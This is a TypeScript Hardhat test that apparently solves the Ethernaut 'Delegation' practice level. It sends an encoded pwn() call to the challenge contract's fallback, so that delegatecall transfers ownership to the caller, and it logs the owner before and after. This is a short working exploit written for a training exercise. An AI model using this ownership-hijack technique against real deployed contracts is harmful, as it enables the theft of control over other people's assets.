import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let delegate: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Delegation`);
  const challengeAddress = await createChallenge(
    `0x9451961b7Aea1Df57bc20CC68D72f662241b5493`
  );
  challenge = await challengeFactory.attach(challengeAddress);
//  const delegateFactory = await ethers.getContractFactory(`Delegate`);
//  delegate = await delegateFactory.deploy(challengeAddress);
});

it("solves the challenge", async function () {
  const iface =
    new ethers.utils.Interface(["function pwn() public"]);
  const methodCallData: string = iface.encodeFunctionData("pwn()");
  console.log("encodeFunctionData(\"pwn()\")", methodCallData);
  console.log("Our address: ", await eoa.getAddress());
  console.log("Owner before: ", await challenge.owner());
  tx = await eoa.sendTransaction({
     to: challenge.address,
     data: methodCallData,
     gasLimit: BigNumber.from(`100000`)
  });
  console.log(await tx.wait());
  console.log("Owner after: ", await challenge.owner());


});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
